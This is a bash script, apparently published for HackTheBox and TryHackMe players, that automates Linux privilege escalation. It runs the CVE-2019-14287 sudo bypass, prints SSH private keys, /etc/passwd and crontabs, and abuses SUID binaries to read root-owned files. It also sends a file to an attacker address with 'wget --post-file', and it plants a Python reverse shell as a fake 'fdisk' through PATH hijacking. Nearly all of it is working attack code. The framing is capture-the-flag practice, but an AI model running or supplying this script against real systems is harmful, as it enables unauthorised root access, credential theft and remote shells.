#!/bin/bash

echo "-------Built for users who are trying to do some privesc on hackthebox or tryhackme with less output and some automated privesc tasks.------------"
echo "-----------Github nk3sec-----------"
echo "-----------Tested on Linux Privesc Playground, Sudo Security Bypass, and  on tryhackme---------"
echo
echo
uname -a
whoami
echo  "Trying sudo -l. Please enter that password if you know it"
sudo -l
echo "Trying CVE-2019-14287. Sudo vulnerability."
sudo -u#4294967295 /bin/bash
sudo -u#-1 /bin/bash
if sudo -u#4294967295 /bin/bash;
then
exit 1
elif sudo -u#-1 /bin/bash;
then
exit 1
else
echo "Looks like CVE-2019-14287 has been patched on this machine..."
fi
echo
echo  "Searching for ssh files in the user's directory..."
find $HOME -name ".ssh" -ls
ls -la $HOME/.ssh
if ls -la "$HOME/.ssh" | grep authorized_keys;
then
echo -n "Would you like me to cat the authorized_keys(1), id_rsa(2), id_rsa.pub(3) files, or all? (1, 2, 3, all, or n): "
read RSA
	if [[ $RSA =~ ^[1]$ ]]
	then
	cat $HOME/.ssh/authorized_keys
	else
	echo ""
	fi
		if [[ $RSA =~ ^[2]$ ]]
		then
		cat $HOME/.ssh/id_rsa
		sleep 3
		elif [[ $RSA =~ ^[3]$ ]]
		then
		cat $HOME/.ssh/id_rsa.pub
		sleep 3
			elif [[ $RSA == "all" ]]
			then
			cat $HOME/.ssh/id_rsa.pub
			echo
			cat $HOME/.ssh/authorized_keys
			echo
			cat $HOME/.ssh/id_rsa
			sleep 3
		else
		echo ""
		fi
fi

echo
echo "Trying to ls what is inside root's directory..."
ls -la /root
echo
echo  "Looking at cronjobs..."
crontab -l
echo  "Checking /etc/crontab file..."
cat /etc/crontab

echo
echo  "Checking /etc/passwd file..."
cat /etc/passwd

echo
echo "Seeing what other users are in the home directory..."
ls -la /home
echo
echo
echo "Looking into apache log directories..."
ls -la /var/log/ | grep apache

echo
echo "Checking to see what ports are open..."
netstat -tulpn | grep LISTEN

echo
echo  "Searching for SUID Binaries that might lead to some privesc..."
find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null > .file
echo
echo  "Here are some routes you can take for privesc through SUID binaries..."
echo -n "If there is a certain flag that you are trying to view such as /root/flag.txt then enter it here. Enter 'N' if you do not know: "
read FLAG
sleep 3
if [[ $FLAG =~ ^[Nn]$ ]]
then
echo "Showing possible privesc through SUID Binaries..."
cat .file
rm .file
exit 1
fi
if [[ $FLAG != *.txt ]]
then
echo -n "Make sure your file is typed in correctly.: "
read FLAG
fi
echo "------------------Even if none of the possible privesc commands are not found in the SUID binaries it will try anyway.----------------------"
	if grep -q /usr/bin/tail ".file";
	then
	echo "Found /usr/bin/tail"
	echo -n "Would you like me to try and elevate your privileges with /usr/bin/tail?: "
	read TAIL
		if [[ $TAIL =~ ^[Yy]$ ]]
		then
		echo "Trying privesc with /usr/bin/tail..."
		/usr/bin/tail $FLAG
		elif /usr/bin/tail $FLAG;
		then
		echo ""
		fi
	else
	echo "---------TAIL DOES NOT WORK----------"
	fi
	if grep -q /usr/bin/wget ".file";
	then
	echo "Found /usr/bin/wget";
	echo -n "Would you like me to try and elevate your privileges with /usr/bin/wget?: "
	read WGET
		if [[ $WGET =~ ^[Yy]$ ]]
		then
		echo "Trying privesc with /usr/bin/wget..."
		echo -n "In order to use this one you will need to start a netcat listener on port 4445. (Y/N) when started: "
		read NC
		echo -n "Enter your remote address here: "
		read ADDRESS
		echo "Get ready to check your nc listener!"
		echo "If this works, it will of course stop this script. Just hit ctrl+c to on your nc listener if you wish to continue."
		/usr/bin/wget --post-file=$FLAG http://$ADDRESS:4445
		exit 1
		fi
	else
	echo "---------WGET DOES NOT WORK----------"
	fi
	if grep -q /usr/bin/base64 ".file";
	then
	echo "Found /usr/bin/base64"
	echo -n "Would you like me to try and elevate your privileges with /usr/bin/base64?: "
	read BASE
		if [[ $BASE =~ ^[Yy]$ ]]
		then
		echo "Trying privesc with /usr/bin/base64..."
		/usr/bin/base64 $FLAG | base64 --decode
		exit 1
		fi
	else
	echo "---------BASE64 DOES NOT WORK----------"
	fi
	if grep -q /usr/bin/cut ".file";
	then
	echo "Found /usr/bin/cut"
	echo -n "Would you like me to try and elevate your privileges with /usr/bin/cut?: "
	read CUT
		if [[ $CUT =~ ^[Yy]$ ]]
		then
		echo "Trying privesc with /usr/bin/cut"
		/usr/bin/cut -d "" -f1 $FLAG
		exit 1
		fi
	else
	echo "---------CUT DOES NOT WORK---------"
	fi
	if grep -q /usr/bin/ul ".file";
        then
        echo "Found /usr/bin/ul"
        echo -n "Would you like me to try and elevate your privileges with /usr/bin/ul?: "
        read UL
                if [[ $UL =~ ^[Yy]$ ]]
                then
                echo "Trying privesc with /usr/bin/ul"
                /usr/bin/ul $FLAG
		exit 1
                fi
        else
        echo "---------UL DOES NOT WORK---------"
        fi
	if grep -q /bin/sysinfo ".file"
	then
	echo "Found /bin/sysinfo"
	echo -n "Would you like me to try and elevate your privileges with /bin/sysinfo?: "
	read INFO
		if [[ $INFO =~ ^[Yy]$ ]]
		then
		mkdir /tmp/folder
		cd /tmp/folder
		touch fdisk
		#Inserting shell from pentest monkey
		#Need to test
		#python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LISTEN",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
		echo -n "Enter your remote address here: "
		read LISTEN
		echo "Also start a nc listener on port 1234"
		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($LISTEN,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'" > /tmp/folder/fdisk
		export PATH=/tmp/folder:$PATH
		sysinfo
		fi
	else
	echo "---------SYSINFO DOES NOT WORK---------"
	fi
	if grep -q /usr/bin/file ".file";
	then
	echo "Found /usr/bin/file"
	echo "Would you like me to elevate your privileges with /usr/bin/file?: "
	read FILE1
		if [[ $FILE1 = ^[Yy]$ ]]
		then
		echo "Trying privesc with /usr/bin/file"
		/usr/bin/file -m $FLAG
		fi
	else
	echo "---------FILE DOES NOT WORK---------"
	fi
echo

echo "Searching for python, perl, nc, wget, and curl to see if they are on here for your convenience..."
which python
which python3
which perl
which nc
which wget
which curl
sleep 2
echo
#Option to copy results or ssh keys over to remote machine. 
rm .file
